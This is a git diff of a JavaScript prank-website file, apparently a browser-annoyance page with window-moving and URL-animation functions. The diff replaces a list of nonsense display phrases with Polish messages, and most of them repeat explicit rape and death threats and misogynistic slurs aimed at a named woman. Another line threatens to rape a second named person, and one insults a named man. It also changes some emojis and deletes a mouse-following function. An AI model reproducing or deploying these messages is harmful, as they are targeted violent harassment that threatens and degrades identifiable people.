@@ -75,14 +75,14 @@ const FILE_DOWNLOADS = [
 ]
 
 const PHRASES = [
-  'hello my name is miska, lol',
-  'miska are funny lalalalalalalallalala',
-  'wgl co u cb bo u mn dbr',
-  'knuuurrr eksplozja',
-  'hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw hee haw',
-  'abcdefghijklmnopqrstuvwxyz abcdefghijklmnopqrstuvwxyz',
-  'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaak',
-  'eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo eyo'
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona',
+  'ja cie miska zgwalce',
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona',
+  'co niedziela co niedziela ryszard wujcik kawal cwela',
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona',
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona',
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona',
+  'kasia zycze ci ty kurwo jebana szmato zeby cie kurwa zgwalcili ty jebana szmato odpierdol sie od mojego kolegi bo cie zabije albo zgwalce ty suko pierdolona'
 ]
 
 const LOGOUT_SITES = {
@@ -413,7 +413,7 @@ function animateUrlWithEmojis () {
   }
 
   function animateUrlWithMoons () {
-    const f = ['🌑', '🌘', '🌗', '🌖', '🌕', '🌔', '🌓', '🌒']
+    const f = ['🐶', '🤛']
     const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
     let m = 0
 
@@ -797,14 +797,6 @@ function moveWindowBounce () {
   }, TICK_LENGTH)
 }
 
-/**
- * Follow the user's mouse
- */
-function setupFollowWindow () {
-  document.addEventListener('mousemove', function (e) {
-    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
-  })
-}
 
 /**
  * Show a random troll video in the window.
